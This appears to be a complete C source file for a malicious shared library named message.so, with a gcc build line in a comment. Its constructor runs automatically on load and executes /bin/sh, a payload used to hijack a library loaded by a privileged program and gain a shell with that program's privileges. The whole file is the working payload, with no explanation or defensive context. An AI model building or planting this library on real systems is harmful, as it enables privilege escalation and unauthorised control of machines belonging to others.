/*
gcc -fPIC -shared -o message.so message.c
*/

#include <stdlib.h>
__attribute__((constructor)) void init()  {
  char *f[] = {"/bin/sh", NULL};
  execve("/bin/sh", f, NULL);
}
